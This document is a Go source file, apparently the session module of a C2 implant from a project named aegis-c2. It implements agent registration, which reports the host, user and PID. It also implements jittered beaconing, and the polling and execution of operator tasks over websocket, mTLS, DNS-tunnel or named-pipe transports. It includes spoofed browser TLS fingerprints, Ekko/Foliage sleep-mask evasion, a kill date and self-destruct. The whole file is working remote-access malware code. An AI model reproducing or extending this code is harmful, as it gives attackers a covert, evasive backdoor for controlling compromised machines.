package session

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"math/big"
	"strings"
	"sync"
	"time"

	"github.com/aegis-c2/aegis/agent/config"
	"github.com/aegis-c2/aegis/agent/executor"
	"github.com/aegis-c2/aegis/agent/fingerprint"
	"github.com/aegis-c2/aegis/agent/sleep"
	"github.com/aegis-c2/aegis/agent/transport"
	"github.com/aegis-c2/aegis/shared/ecdh"
	"github.com/aegis-c2/aegis/shared/protocol"
)

// Transporter is the interface for Agent-Server communication.
type Transporter interface {
	Register(env *protocol.Envelope) (*map[string]string, error)
	Heartbeat(env *protocol.Envelope) (*map[string]string, error)
	PollTask(env *protocol.Envelope) ([]byte, error)
	SubmitResult(env *protocol.Envelope) (*map[string]string, error)
}

// MTLSTransporter 是 mTLS C2 传输的 Transporter 包装。
type MTLSTransporter struct {
	channel   *transport.MTLSChannel
	sessionID string
	aesKey    []byte
	cfg       *transport.MTLSConfig
	mu        sync.Mutex
}

func NewMTLSTransporter(cfg *transport.MTLSConfig, sessionID string, aesKey []byte) *MTLSTransporter {
	return &MTLSTransporter{
		channel:   nil, // 延迟连接
		sessionID: sessionID,
		aesKey:    aesKey,
		cfg:       cfg,
	}
}

// SetAESKey updates the AES key after ECDH exchange (BUG-23 fix).
func (m *MTLSTransporter) SetAESKey(key []byte) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.aesKey = key
}

func (m *MTLSTransporter) ensureConnected() error {
	m.mu.Lock()
	if m.channel != nil && !m.channel.YamuxSession().IsClosed() {
		m.mu.Unlock()
		return nil
	}
	if m.cfg == nil {
		m.mu.Unlock()
		return fmt.Errorf("mTLS config not set")
	}

	// Dial while holding the lock — prevents TOCTOU race where two goroutines
	// both see nil channel and dial independently, leaking the first connection.
	ch, err := transport.NewMTLSChannel(m.cfg)
	if err != nil {
		m.mu.Unlock()
		return err
	}
	// Double-check: another goroutine may have connected while we were dialing.
	if m.channel != nil && !m.channel.YamuxSession().IsClosed() {
		ch.Close() // discard duplicate
		m.mu.Unlock()
		return nil
	}
	m.channel = ch
	m.mu.Unlock()
	return nil
}

func (m *MTLSTransporter) Register(env *protocol.Envelope) (*map[string]string, error) {
	if err := m.ensureConnected(); err != nil {
		return nil, err
	}
	msg := &transport.DNSMsg{
		Type:    transport.MsgTypeRegister,
		Length:  uint32(len(env.Payload)),
		Payload: env.Payload,
	}
	resp, err := m.channel.Send(msg.Encode())
	if err != nil {
		return nil, err
	}
	result := map[string]string{"agent_id": m.sessionID, "status": "ok"}
	if len(resp) > 0 {
		result["response"] = string(resp)
	}
	return &result, nil
}

func (m *MTLSTransporter) Heartbeat(env *protocol.Envelope) (*map[string]string, error) {
	if err := m.ensureConnected(); err != nil {
		return nil, err
	}
	msg := &transport.DNSMsg{
		Type:    transport.MsgTypeHeartbeat,
		Length:  uint32(len(env.Payload)),
		Payload: env.Payload,
	}
	_, err := m.channel.Send(msg.Encode())
	if err != nil {
		return nil, err
	}
	return &map[string]string{"status": "ok"}, nil
}

func (m *MTLSTransporter) PollTask(env *protocol.Envelope) ([]byte, error) {
	if err := m.ensureConnected(); err != nil {
		return nil, err
	}
	// 发送 poll 请求
	msg := &transport.DNSMsg{
		Type:    transport.MsgTypePoll,
		Length:  uint32(len(env.Payload)),
		Payload: env.Payload,
	}
	if _, err := m.channel.Send(msg.Encode()); err != nil {
		return nil, err
	}
	// 等待响应
	data, err := m.channel.Recv()
	if err != nil {
		return nil, err
	}
	if len(data) == 0 {
		return nil, nil
	}
	if len(data) >= 5 {
		dnsMsg, err := transport.DecodeDNSMsg(data)
		if err == nil && dnsMsg.Type == transport.MsgTypeTask {
			return dnsMsg.Payload, nil
		}
	}
	return data, nil
}

func (m *MTLSTransporter) SubmitResult(env *protocol.Envelope) (*map[string]string, error) {
	if err := m.ensureConnected(); err != nil {
		return nil, err
	}
	msg := &transport.DNSMsg{
		Type:    transport.MsgTypeResult,
		Length:  uint32(len(env.Payload)),
		Payload: env.Payload,
	}
	_, err := m.channel.Send(msg.Encode())
	if err != nil {
		return nil, err
	}
	return &map[string]string{"status": "ok"}, nil
}

// DNSTransporter 是 DNS C2 传输的 Transporter 包装。
type DNSTransporter struct {
	channel   *transport.DNSChannel
	sessionID string
	aesKey    []byte
}

func NewDNSTransporter(cfg *transport.DNSConfig, sessionID string, aesKey []byte) *DNSTransporter {
	return &DNSTransporter{
		channel:   transport.NewDNSChannel(cfg),
		sessionID: sessionID,
		aesKey:    aesKey,
	}
}

// SetAESKey updates the AES key after ECDH exchange (BUG-23 fix).
func (d *DNSTransporter) SetAESKey(key []byte) {
	d.aesKey = key
}

func (d *DNSTransporter) Register(env *protocol.Envelope) (*map[string]string, error) {
	msg := &transport.DNSMsg{
		Type:    transport.MsgTypeRegister,
		Length:  uint32(len(env.Payload)),
		Payload: env.Payload,
	}
	resp, err := d.channel.Send(msg.Encode())
	if err != nil {
		return nil, err
	}
	result := map[string]string{"agent_id": d.sessionID, "status": "ok"}
	if len(resp) > 0 {
		result["response"] = string(resp)
	}
	return &result, nil
}

func (d *DNSTransporter) Heartbeat(env *protocol.Envelope) (*map[string]string, error) {
	msg := &transport.DNSMsg{
		Type:    transport.MsgTypeHeartbeat,
		Length:  uint32(len(env.Payload)),
		Payload: env.Payload,
	}
	_, err := d.channel.Send(msg.Encode())
	if err != nil {
		return nil, err
	}
	return &map[string]string{"status": "ok"}, nil
}

func (d *DNSTransporter) PollTask(env *protocol.Envelope) ([]byte, error) {
	data, err := d.channel.Recv(d.sessionID)
	if err != nil {
		return nil, err
	}
	if len(data) == 0 {
		return nil, nil
	}
	if len(data) >= 5 {
		dnsMsg, err := transport.DecodeDNSMsg(data)
		if err == nil && dnsMsg.Type == transport.MsgTypeTask {
			return dnsMsg.Payload, nil
		}
	}
	return data, nil
}

func (d *DNSTransporter) SubmitResult(env *protocol.Envelope) (*map[string]string, error) {
	msg := &transport.DNSMsg{
		Type:    transport.MsgTypeResult,
		Length:  uint32(len(env.Payload)),
		Payload: env.Payload,
	}
	_, err := d.channel.Send(msg.Encode())
	if err != nil {
		return nil, err
	}
	return &map[string]string{"status": "ok"}, nil
}

// KeyEncryptor 是加密 AES 密钥的接口（向后兼容 RSA）。
type KeyEncryptor interface {
	EncryptWithServerKey(serverPubKey, aesKey []byte) ([]byte, error)
	DecryptWithPrivateKey(ciphertext []byte) ([]byte, error)
	PublicKeyPEM() []byte
}

// ECDHKeyExchanger 是 X25519 ECDH 密钥交换接口。
type ECDHKeyExchanger interface {
	PublicKey() []byte
	DeriveSessionKeys(serverPubKey []byte, agentID string) (aesKey, hmacKey []byte, err error)
}

// Config 是 Agent 会话的配置。
type Config struct {
	ServerURL         string
	ServerPubKey      []byte
	ServerECDHPubKey  []byte // X25519 公钥（32 字节，优先于 ServerPubKey）
	HeartbeatInterval int
	HeartbeatJitter   int
	UserAgent         string
	ProcessName       string
	AgentConfig       *config.AgentConfig
}

// Session 管理 Agent 与服务器的整个生命周期。
type Session struct {
	cfg         Config
	agentID     string
	trans       Transporter
	exec        *executor.Executor
	seqMu       sync.Mutex
	seqNum      uint64
	aesKey      []byte
	hmacKey     []byte
	keyEnc      KeyEncryptor
	ecdh        ECDHKeyExchanger
	nonceSalt   [4]byte // 随机前缀，防止重启后 nonce 重用
	autonomyFn  func()  // 可选：每次心跳后调用自主决策
	ctx         context.Context
	cancel      context.CancelFunc
	killDate    time.Time // 运行时可修改的 kill date（BUG-15 fix）
	gcm         cipher.AEAD // P2-1: cache AES-GCM to avoid per-envelope allocation
}

// New 创建新的 Agent 会话。
func New(cfg Config, exec *executor.Executor, aesKey []byte, keyEnc KeyEncryptor) *Session {
	return newSession(cfg, exec, aesKey, keyEnc, nil)
}

// NewWithECDH 使用 X25519 ECDH 创建新的 Agent 会话。
func NewWithECDH(cfg Config, exec *executor.Executor, ecdh ECDHKeyExchanger) *Session {
	return newSession(cfg, exec, nil, nil, ecdh)
}

func newSession(cfg Config, exec *executor.Executor, aesKey []byte, keyEnc KeyEncryptor, ecdh ECDHKeyExchanger) *Session {
	var trans Transporter

	if cfg.AgentConfig != nil {
		switch cfg.AgentConfig.TransportType {
		case "websocket":
			profileCfg := &transport.ProfileConfig{
				ServerURLs:       cfg.AgentConfig.ServerURLs,
				UserAgent:        cfg.AgentConfig.UserAgent,
				Method:           cfg.AgentConfig.Method,
				Path:             cfg.AgentConfig.Path,
				Headers:          cfg.AgentConfig.Headers,
				CookieName:       cfg.AgentConfig.CookieName,
				ParamName:        cfg.AgentConfig.ParamName,
				DataTransform:    cfg.AgentConfig.DataTransform,
				RotationStrategy: cfg.AgentConfig.RotationStrategy,
				InsecureTLS:      true,
				TLSFingerprint:   fingerprint.BrowserProfile(cfg.AgentConfig.TLSFingerprint),
			}
			trans = transport.NewWSTransport(profileCfg)
		case "mtls":
			if len(cfg.AgentConfig.ServerURLs) == 0 {
				log.Printf("[session] mTLS transport requested but ServerURLs is empty")
				return nil
			}
			mtlsCfg := &transport.MTLSConfig{
				ServerAddr: cfg.AgentConfig.ServerURLs[0],
				CACert:     nil,
				ClientCert: nil,
			}
			trans = NewMTLSTransporter(mtlsCfg, cfg.AgentConfig.AgentID, aesKey)
		case "dns":
			dnsCfg := &transport.DNSConfig{
				Domain:     cfg.AgentConfig.DNSDomain,
				Nameserver: cfg.AgentConfig.DNSNameserver,
				RecordType: cfg.AgentConfig.DNSRecordType,
			}
			trans = NewDNSTransporter(dnsCfg, cfg.AgentConfig.AgentID, aesKey)
		case "namedpipe":
			pipeCfg := &transport.NamedPipeTransportConfig{
				PipeName:   cfg.AgentConfig.PipeName,
				RemoteHost: cfg.AgentConfig.PipeRemoteHost,
			}
			trans = transport.NewNamedPipeTransport(pipeCfg, cfg.AgentConfig.AgentID)
		default:
			profileCfg := &transport.ProfileConfig{
				ServerURLs:       cfg.AgentConfig.ServerURLs,
				UserAgent:        cfg.AgentConfig.UserAgent,
				Method:           cfg.AgentConfig.Method,
				Path:             cfg.AgentConfig.Path,
				Headers:          cfg.AgentConfig.Headers,
				CookieName:       cfg.AgentConfig.CookieName,
				ParamName:        cfg.AgentConfig.ParamName,
				DataTransform:    cfg.AgentConfig.DataTransform,
				RotationStrategy: cfg.AgentConfig.RotationStrategy,
				InsecureTLS:      true,
				TLSFingerprint:   fingerprint.BrowserProfile(cfg.AgentConfig.TLSFingerprint),
			}
			trans = transport.NewWithProfile(profileCfg)
		}
	} else {
		trans = transport.New(cfg.ServerURL, cfg.UserAgent, cfg.HeartbeatInterval, cfg.HeartbeatJitter, true)
	}

	// 生成随机 nonce 前缀，防止重启后 seqNum 归零导致 nonce 重用
	var nonceSalt [4]byte
	if _, err := rand.Read(nonceSalt[:]); err != nil {
		// crypto/rand 失败时使用时间戳派生的盐（降级但仍优于固定值）
		nonceSalt = [4]byte{byte(time.Now().UnixNano()), byte(time.Now().UnixNano() >> 8), byte(time.Now().UnixNano() >> 16), byte(time.Now().UnixNano() >> 24)}
	}

	ctx, cancel := context.WithCancel(context.Background())

	// RSA fallback: generate a random AES key if caller did not supply one.
	// Without this, EncryptWithServerKey() encrypts nil → empty key → all
	// subsequent AES-GCM operations fail.
	if aesKey == nil && keyEnc != nil && ecdh == nil {
		aesKey = make([]byte, 16)
		if _, err := rand.Read(aesKey); err != nil {
			log.Printf("[session] failed to generate AES key: %v", err)
			aesKey = nil
		}
	}

	return &Session{
		cfg:       cfg,
		trans:     trans,
		exec:      exec,
		aesKey:    aesKey,
		keyEnc:    keyEnc,
		ecdh:      ecdh,
		nonceSalt: nonceSalt,
		ctx:       ctx,
		cancel:    cancel,
	}
}

// Run 启动 Agent 主循环。
func (s *Session) Run() error {
	if err := s.register(); err != nil {
		return err
	}
	log.Printf("[session] registered: id=%s", s.agentID)

	sleepFn := s.getSleepFunc()

	for {
		select {
		case <-s.ctx.Done():
			log.Printf("[session] shutdown requested")
			return nil
		default:
		}

		s.heartbeat()

		// BUG-15 fix: Enforce runtime-configurable kill date
		if !s.killDate.IsZero() && time.Now().After(s.killDate) {
			log.Printf("[session] kill_date reached (%s), shutting down", s.killDate.Format("2006-01-02"))
			return nil
		}

		s.pollAndExecute()

		// 自主决策检查（如果设置了钩子）
		if s.autonomyFn != nil {
			s.autonomyFn()
		}

		sleepTime := s.calculateSleep()
		if sleepFn != nil {
			sleepFn(sleepTime)
		} else {
			time.Sleep(sleepTime)
		}
	}
}

// Stop 请求 Agent 优雅停止。
func (s *Session) Stop() {
	if s.cancel != nil {
		s.cancel()
	}
}

// AgentID 返回当前 Agent ID。
func (s *Session) AgentID() string {
	return s.agentID
}

// Reconfig 运行时修改 Agent 配置。
// 支持字段: heartbeat, jitter, kill_date, technique, selfdestruct, transport
func (s *Session) Reconfig(field, value string) error {
	switch field {
	case "heartbeat":
		var secs int
		if _, err := fmt.Sscanf(value, "%d", &secs); err != nil {
			return fmt.Errorf("invalid heartbeat: %s", value)
		}
		if secs < 0 {
			return fmt.Errorf("heartbeat must be positive")
		}
		s.cfg.HeartbeatInterval = secs
	case "jitter":
		var secs int
		if _, err := fmt.Sscanf(value, "%d", &secs); err != nil {
			return fmt.Errorf("invalid jitter: %s", value)
		}
		if secs < 0 {
			return fmt.Errorf("jitter must be positive")
		}
		s.cfg.HeartbeatJitter = secs
	case "kill_date":
		kd, err := time.Parse("2006-01-02", value)
		if err != nil {
			return fmt.Errorf("invalid kill_date (use YYYY-MM-DD): %s", value)
		}
		if time.Now().After(kd) {
			return fmt.Errorf("kill_date is in the past")
		}
		s.killDate = kd
	case "technique":
		if s.cfg.AgentConfig != nil {
			switch value {
			case "none", "ekko", "foliage":
				s.cfg.AgentConfig.SleepTechnique = value
				if value == "none" {
					s.cfg.AgentConfig.SleepMaskEnabled = false
				} else {
					s.cfg.AgentConfig.SleepMaskEnabled = true
				}
			default:
				return fmt.Errorf("unknown technique: %s (valid: none/ekko/foliage)", value)
			}
		}
	case "selfdestruct":
		var secs int
		if _, err := fmt.Sscanf(value, "%d", &secs); err != nil {
			return fmt.Errorf("invalid selfdestruct value: %s", value)
		}
		if secs > 0 {
			// Use select + ctx.Done() so timer can be cancelled (BUG-18 fix)
			go func() {
				select {
				case <-time.After(time.Duration(secs) * time.Second):
					log.Printf("[session] self-destruct timer expired (%ds)", secs)
					s.cancel()
				case <-s.ctx.Done():
					return // agent shutting down, skip self-destruct
				}
			}()
		}
	case "transport":
		// Transport switching is not possible at runtime (would require new transporter)
		return fmt.Errorf("transport cannot be changed at runtime")
	default:
		return fmt.Errorf("unknown reconfig field: %s (valid: heartbeat/jitter/kill_date/technique/selfdestruct)", field)
	}
	return nil
}

// CurrentConfig 返回当前运行时配置的摘要。
func (s *Session) CurrentConfig() string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("heartbeat: %ds\n", s.cfg.HeartbeatInterval))
	sb.WriteString(fmt.Sprintf("jitter:    %ds\n", s.cfg.HeartbeatJitter))
	sb.WriteString(fmt.Sprintf("agent_id:  %s\n", s.agentID))
	sb.WriteString(fmt.Sprintf("transport: %T\n", s.trans))
	if s.cfg.AgentConfig != nil {
		ac := s.cfg.AgentConfig
		sb.WriteString(fmt.Sprintf("technique: %s\n", ac.SleepTechnique))
		sb.WriteString(fmt.Sprintf("urls:      %v\n", ac.ServerURLs))
		sb.WriteString(fmt.Sprintf("strategy:  %s\n", ac.RotationStrategy))
	}
	return sb.String()
}

func (s *Session) getSleepFunc() func(time.Duration) {
	if s.cfg.AgentConfig == nil {
		return nil
	}
	ac := s.cfg.AgentConfig
	if !ac.SleepMaskEnabled || ac.SleepTechnique == "" || ac.SleepTechnique == "none" {
		return nil
	}
	switch ac.SleepTechnique {
	case "ekko":
		return sleep.EkkoSleep
	case "foliage":
		return sleep.FoliageSleep
	default:
		return nil
	}
}

// register 向 Server 发送注册请求。
// 优先使用 X25519 ECDH，回退到 RSA。
func (s *Session) register() error {
	s.agentID = GenerateID()

	reg := protocol.RegisterPayload{
		AgentID:  s.agentID,
		Hostname: Hostname(),
		OS:       GOOS(),
		Arch:     GOARCH(),
		Username: Username(),
		PID:      PID(),
	}

	// 优先：X25519 ECDH 密钥交换
	if s.ecdh != nil && len(s.cfg.ServerECDHPubKey) == 32 {
		aesKey, hmacKey, err := s.ecdh.DeriveSessionKeys(s.cfg.ServerECDHPubKey, s.agentID)
		if err != nil {
			log.Printf("[session] ECDH key exchange failed: %v, falling back to RSA", err)
		} else {
			s.aesKey = aesKey
		s.hmacKey = hmacKey
		reg.ECDHPubKey = s.ecdh.PublicKey()
		log.Printf("[session] ECDH key exchange completed")

		// P2-1: cache AES-GCM to avoid per-envelope allocation
		block, err := aes.NewCipher(aesKey)
		if err == nil {
			s.gcm, _ = cipher.NewGCM(block)
		}

			// BUG-23 fix: Update transporter's aesKey after ECDH exchange
			switch t := s.trans.(type) {
			case *MTLSTransporter:
				t.SetAESKey(aesKey)
			case *DNSTransporter:
				t.SetAESKey(aesKey)
			}

			payloadBytes, err := json.Marshal(reg)
			if err != nil {
				return fmt.Errorf("marshal register: %w", err)
			}
			// ECDH-P0: Registration MUST NOT encrypt payload -- server needs to
			// extract ECDHPubKey to derive AES key first. No HMAC signing possible
			// yet (no shared key at registration time — integrity relies on the
			// ECDH exchange itself succeeding).
			env := s.buildEnvelopeRaw(protocol.TypeRegister, payloadBytes)
			resp, err := s.trans.Register(env)
			if err != nil {
				return err
			}
			if resp != nil {
				if id, ok := (*resp)["agent_id"]; ok {
					s.agentID = id
				}
			}
			return nil
		}
	}

	// 回退：RSA 密钥交换
	if s.cfg.ServerPubKey != nil && s.keyEnc != nil {
		// Generate a random AES key for RSA encryption fallback
		if s.aesKey == nil {
			key := make([]byte, 32)
			if _, err := rand.Read(key); err != nil {
				return fmt.Errorf("generate AES key for RSA fallback: %w", err)
			}
			s.aesKey = key
		}
		aesKeyEnc, err := s.keyEnc.EncryptWithServerKey(s.cfg.ServerPubKey, s.aesKey)
		if err != nil {
			log.Printf("[session] failed to encrypt AES key: %v", err)
			return fmt.Errorf("encrypt AES key: %w", err)
		}
		reg.AESKeyEnc = aesKeyEnc
		reg.PubKeyPEM = s.keyEnc.PublicKeyPEM()
	} else {
		// No key exchange available -- registration will be sent unencrypted
		log.Printf("[session] WARNING: no key exchange or RSA pubkey available, registration sent in plaintext")
	}

	payloadBytes, _ := json.Marshal(reg)
	// ECDH-P0: Same fix -- registration MUST NOT encrypt payload
	env := s.buildEnvelopeRaw(protocol.TypeRegister, payloadBytes)

	resp, err := s.trans.Register(env)
	if err != nil {
		return err
	}

	if resp != nil {
		if id, ok := (*resp)["agent_id"]; ok {
			s.agentID = id
		}
		// Adopt AES key from server response (dev mode or server-generated key)
		s.adoptAESKeyFromResponse(resp)
	}
	return nil
}

// adoptAESKeyFromResponse adopts an AES key sent by the server in the
// registration response. The server generates a key when no key exchange
// occurred (dev mode) and returns it so agent and server share a secret.
func (s *Session) adoptAESKeyFromResponse(resp *map[string]string) {
	// Plaintext hex key (dev mode)
	if hexKey, ok := (*resp)["aes_key"]; ok && hexKey != "" {
		key, err := hex.DecodeString(hexKey)
		if err == nil && len(key) == 16 {
			s.aesKey = key
			s.hmacKey = key
			block, err := aes.NewCipher(key)
			if err == nil {
				s.gcm, _ = cipher.NewGCM(block)
			}
			log.Printf("[session] adopted server-generated AES key (dev mode)")
			return
		}
	}
	// Encrypted key (agent sent pubkey in registration)
	if encHex, ok := (*resp)["aes_key_enc"]; ok && encHex != "" && s.keyEnc != nil {
		enc, err := hex.DecodeString(encHex)
		if err != nil {
			return
		}
		plaintext, err := s.keyEnc.DecryptWithPrivateKey(enc)
		if err != nil {
			return
		}
		s.aesKey = plaintext
		s.hmacKey = plaintext
		block, err := aes.NewCipher(plaintext)
		if err == nil {
			s.gcm, _ = cipher.NewGCM(block)
		}
		log.Printf("[session] adopted server-encrypted AES key")
	}
}

func (s *Session) heartbeat() {
	s.seqMu.Lock()
	s.seqNum++
	seq := s.seqNum
	s.seqMu.Unlock()

	hb := protocol.HeartbeatPayload{
		AgentID: s.agentID,
		SeqNum:  seq,
	}
	payloadBytes, _ := json.Marshal(hb)
	env, err := s.buildEnvelopeWithSeq(protocol.TypeHeartbeat, payloadBytes, seq)
	if err != nil {
		log.Printf("[session] heartbeat envelope build failed: %v", err)
		return
	}

	_, err = s.trans.Heartbeat(env)
	if err != nil {
		log.Printf("[session] heartbeat failed: %v", err)
	}
}

func (s *Session) pollAndExecute() {
	s.seqMu.Lock()
	s.seqNum++
	seq := s.seqNum
	s.seqMu.Unlock()

	hb := protocol.HeartbeatPayload{
		AgentID: s.agentID,
		SeqNum:  seq,
	}
	payloadBytes, _ := json.Marshal(hb)
	env, err := s.buildEnvelopeWithSeq(protocol.TypeTask, payloadBytes, seq)
	if err != nil {
		log.Printf("[session] poll envelope build failed: %v", err)
		return
	}

	taskBytes, err := s.trans.PollTask(env)
	if err != nil {
		log.Printf("[session] poll failed: %v", err)
		return
	}
	if len(taskBytes) == 0 {
		return
	}

	var pollResp struct {
		Task *protocol.TaskPayload `json:"task"`
	}
	if err := json.Unmarshal(taskBytes, &pollResp); err != nil {
		log.Printf("[session] failed to parse poll response: %v (raw: %d bytes)", err, len(taskBytes))
		return
	}
	if pollResp.Task == nil {
		return
	}

	task := pollResp.Task
	log.Printf("[session] executing task: %s cmd=%s args=%s", task.TaskID, task.Command, task.Args)

	result := s.exec.Execute(task)
	result.AgentID = s.agentID

	resultBytes, _ := json.Marshal(result)
	resultEnv, err := s.buildEnvelope(protocol.TypeResult, resultBytes)
	if err != nil {
		log.Printf("[session] result envelope build failed: %v", err)
		return
	}
	_, err = s.trans.SubmitResult(resultEnv)
	if err != nil {
		log.Printf("[session] result submit failed: %v", err)
	} else {
		log.Printf("[session] task %s completed: %s", task.TaskID, result.Status)
	}
}

func (s *Session) buildEnvelopeRaw(msgType string, payload []byte) *protocol.Envelope {
	s.seqMu.Lock()
	s.seqNum++
	seq := s.seqNum
	s.seqMu.Unlock()

	nonce := ecdh.DeterministicNonce(seq, s.nonceSalt[:])
	return &protocol.Envelope{
		Timestamp: time.Now().UnixMilli(),
		AgentID:   s.agentID,
		Type:      msgType,
		Payload:   payload,
		Nonce:     nonce,
	}
}

func (s *Session) buildEnvelope(msgType string, payload []byte) (*protocol.Envelope, error) {
	s.seqMu.Lock()
	s.seqNum++
	seq := s.seqNum
	s.seqMu.Unlock()

	return s.buildEnvelopeWithSeq(msgType, payload, seq)
}

func (s *Session) buildEnvelopeWithSeq(msgType string, payload []byte, seqNum uint64) (*protocol.Envelope, error) {
	nonce := ecdh.DeterministicNonce(seqNum, s.nonceSalt[:])

	encrypted := payload
	if len(s.aesKey) > 0 && s.gcm != nil {
		encrypted = s.gcm.Seal(nil, nonce, payload, nil)
	} else if len(s.aesKey) > 0 {
		// Fallback: GCM not cached yet, create on-demand
		block, err := aes.NewCipher(s.aesKey)
		if err != nil {
			return nil, fmt.Errorf("aes cipher: %w", err)
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, fmt.Errorf("gcm: %w", err)
		}
		encrypted = gcm.Seal(nil, nonce, payload, nil)
	}

	env := &protocol.Envelope{
		Timestamp: time.Now().UnixMilli(),
		AgentID:   s.agentID,
		Type:      msgType,
		Payload:   encrypted,
		Nonce:     nonce,
	}

	if len(s.aesKey) > 0 {
		hmacKey := s.aesKey
		if len(s.hmacKey) > 0 {
			hmacKey = s.hmacKey
		}
		env.Sign(hmacKey)
	}

	return env, nil
}

func (s *Session) calculateSleep() time.Duration {
	base := time.Duration(s.cfg.HeartbeatInterval) * time.Second
	jitter := time.Duration(s.cfg.HeartbeatJitter) * time.Second

	if jitter > 0 {
		// A-P1-7: Symmetric jitter — sleep in [base - jitter, base + jitter]
		// rather than always adding to base (which biases sleep high)
		randVal, err := rand.Int(rand.Reader, big.NewInt(int64(jitter*2)))
		if err == nil {
			base = base - jitter + time.Duration(randVal.Int64())
			if base < 0 {
				base = 0
			}
		} else {
			// Fallback: use time-based jitter if crypto/rand fails
			base = base - jitter + time.Duration(time.Now().UnixNano()%int64(jitter*2))
			if base < 0 {
				base = 0
			}
		}
	}
	return base
}

func (s *Session) Transport() Transporter {
	return s.trans
}

// SetAutonomyHook 设置自主决策钩子。
// 每次心跳+拉取循环后调用，可触发自毁或修改睡眠策略。
func (s *Session) SetAutonomyHook(fn func()) {
	s.autonomyFn = fn
}

// hexDecode 从 hex 字符串解码字节。
func hexDecode(s string) []byte {
	if s == "" {
		return nil
	}
	data, err := hex.DecodeString(s)
	if err != nil {
		return nil
	}
	return data
}
